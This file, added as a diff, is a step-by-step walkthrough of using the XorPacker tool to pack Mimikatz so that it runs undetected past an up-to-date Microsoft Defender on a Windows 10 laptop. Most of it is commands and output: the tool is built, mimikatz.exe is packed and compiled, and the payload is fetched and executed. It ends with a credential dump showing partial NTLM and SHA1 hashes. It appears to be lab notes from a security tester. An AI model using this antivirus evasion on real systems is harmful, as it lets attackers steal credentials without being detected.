@@ -1,0 +1,176 @@
+=========================================================================================================================================================
+AV bypass using the tool 'XorPacker'
+=========================================================================================================================================================
+
+=> Source: https://github.com/tmenochet/XorPacker
+
+It is a packer software that uses XOR encryption. The resulting packed PE uses a bruteforce attack to decrypt the payload and evade AV sandbox.
+
+XorPacker can be used to pack:
+=> PE
+=> .NET assembly
+=> Shellcode
+
+
+=========================================================================================================================================================
+PoC - Example with Mimikatz.exe (x64) running on a Windows 10 laptop (with the MS Defender AV enabled & up-to-date)
+=========================================================================================================================================================
+
+Step 1 - Build the tool 'XorPacker' (https://github.com/tmenochet/XorPacker)
+==============================================================================
+
+jeff@kali:~$ cd Documents/Tools/XorPacker-master/
+jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al
+total 68
+drwxr-xr-x  3 jeff jeff  4096 Oct 19  2020 .
+drwxr-xr-x 32 jeff jeff  4096 Dec 21 01:19 ..
+-rw-r--r--  1 jeff jeff    97 Oct 19  2020 .gitmodules
+-rw-r--r--  1 jeff jeff 35148 Oct 19  2020 LICENSE
+drwxr-xr-x  2 jeff jeff  4096 Oct 19  2020 MemoryModule
+-rwxr-xr-x  1 jeff jeff  1910 Oct 19  2020 README.md
+-rwxr-xr-x  1 jeff jeff  1615 Oct 19  2020 stub_shellcode_go.py
+-rwxr-xr-x  1 jeff jeff  1934 Oct 19  2020 stub_unmanaged_go.py
+-rwxr-xr-x  1 jeff jeff  2720 Oct 19  2020 xorpacker.py
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ sudo apt install cmake
+[sudo] password for jeff: 
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+<SNIP>
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ sudo apt install g++-mingw-w64-x86-64 gcc-mingw-w64-x86-64 g++-mingw-w64-i686 gcc-mingw-w64-i686
+Reading package lists... Done
+Building dependency tree       
+<SNIP>
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ cd ./MemoryModule
+jeff@kali:~/Documents/Tools/XorPacker-master/MemoryModule$ mkdir build; cd build
+jeff@kali:~/Documents/Tools/XorPacker-master/MemoryModule/build$ cmake ..
+-- The C compiler identification is GNU 12.2.0
+-- The CXX compiler identification is GNU 12.2.0
+-- Detecting C compiler ABI info
+-- Detecting C compiler ABI info - done
+-- Check for working C compiler: /usr/bin/cc - skipped
+<SNIP>
+
+jeff@kali:~/Documents/Tools/XorPacker-master/MemoryModule/build$ make MemoryModule
+[ 50%] Building C object CMakeFiles/MemoryModule.dir/MemoryModule.c.o
+[100%] Linking C static library MemoryModule.a
+[100%] Built target MemoryModule
+
+
+jeff@kali:~/Documents/Tools/xorpacker$ sudo apt install golang-1.19-go
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+<SNIP>
+
+jeff@kali:~/Documents/Tools$ sudo apt install golang-go
+Reading package lists... Done
+Building dependency tree       
+Reading state information... Done
+<SNIP>
+
+
+Step 2 - Generate an encrypted packed version of the tool Mimikatz.exe (x64) using 'XorPacker'
+========================================================================================================
+
+
+jeff@kali:~/Documents/Tools/XorPacker-master/$ curl -v http://192.168.1.113:8081/mimikatz.exe -O
+*   Trying 192.168.1.113:8081...
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0* Connected to 192.168.1.113 (192.168.1.113) port 8081 (#0)
+<SNIP>
+
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ python3 ./xorpacker.py -f mimikatz.exe -t UNMANAGED 
+
+[>] Payload file: mimikatz.exe
+[>] Payload type: UNMANAGED
+
+[*] Encrypting payload...
+[*] Compressing payload...
+[*] Encoding payload...
+[*] Generating source file...
+
+[>] You should now build payload.go
+
+
+jeff@kali:~/Documents/Tools/XorPacker-master$ GOOS=windows GOARCH=amd64 CGO_ENABLED=1 CC=x86_64-w64-mingw32-gcc go build payload.go                                                    
+                                                                                                                                                                                        
+jeff@kali:~/Documents/Tools/XorPacker-master$ ls -al                                                                                                                                                                                      
+total 6388                                                                                                                                                                                                                                 
+drwxr-xr-x  4 jeff jeff    4096 Dec 21 01:52 .                                                                                                                                                                                             
+drwxr-xr-x 32 jeff jeff    4096 Dec 21 01:19 ..                                                                                                                                                                                            
+-rw-r--r--  1 jeff jeff      97 Oct 19  2020 .gitmodules                                                                                                                                                                                   
+-rw-r--r--  1 jeff jeff   35148 Oct 19  2020 LICENSE                                                                                                                                                                                       
+drwxr-xr-x  7 jeff jeff    4096 Dec 21 01:40 MemoryModule                                                                                                                                                                                  
+-rw-r--r--  1 jeff jeff 1355680 Dec 21 01:39 mimikatz.exe                                                                                                                                                                                  
+-rw-r--r--  1 jeff jeff   11805 Dec 21 01:49 Notes.txt
+-rwxr-xr-x  1 jeff jeff 4102456 Dec 21 01:52 payload.exe
+-rw-r--r--  1 jeff jeff  994622 Dec 21 01:44 payload.go
+drwxr-xr-x  2 jeff jeff    4096 Dec 21 01:42 __pycache__
+-rwxr-xr-x  1 jeff jeff    1910 Oct 19  2020 README.md
+-rwxr-xr-x  1 jeff jeff    1615 Oct 19  2020 stub_shellcode_go.py
+-rwxr-xr-x  1 jeff jeff    1934 Oct 19  2020 stub_unmanaged_go.py
+-rwxr-xr-x  1 jeff jeff    2720 Oct 19  2020 xorpacker.py
+
+
+Step 3 - Download and execute the packed version of Mimkatz on a Windows 10 laptop without being detected nor blocked by the MS Defender AV
+============================================================================================================================================
+
+PS C:\Users\Administrator.PO718687\Downloads> wget -URI http://192.168.1.30:8080/payload.exe -OutFile payload.exe
+
+PS C:\Users\Administrator.PO718687\Downloads> Get-MpComputerStatus | Select RealTimeProtectionEnabled, IoavProtectionEnabled,AntispywareEnabled | FL
+
+RealTimeProtectionEnabled : True
+IoavProtectionEnabled     : True
+AntispywareEnabled        : True
+
+
+PS C:\Users\Administrator.PO718687\Downloads> .\payload.exe
+
+  .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
+ '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
+  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/
+
+mimikatz # privilege::debug
+Privilege '20' OK
+
+mimikatz # sekurlsa::logonpasswords
+
+Authentication Id : 0 ; 33201662 (00000000:01fa9dfe)
+Session           : Interactive from 2
+User Name         : Administrator
+Domain            : PO718687
+Logon Server      : PO718687
+Logon Time        : 20/12/2022 19:52:06
+SID               : S-1-5-21-936125016-2310263949-2175806047-500
+        msv :
+         [00000003] Primary
+         * Username : Administrator
+         * Domain   : PO718687
+         * NTLM     : 36f7a3ebaa54935ecf03678e<snip>
+         * SHA1     : d5feabcececab0e16c2cbb39<snip>
+        tspkg :
+         * Username : Administrator
+         * Domain   : PO718687
+         * Password : <snip>
+        wdigest :
+         * Username : Administrator
+         * Domain   : PO718687
+         * Password : (null)
+        kerberos :
+         * Username : Administrator
+         * Domain   : PO718687
+         * Password : (null)
+        ssp :
+        credman :
+        cloudap :       KO
+        
+<SNIP>
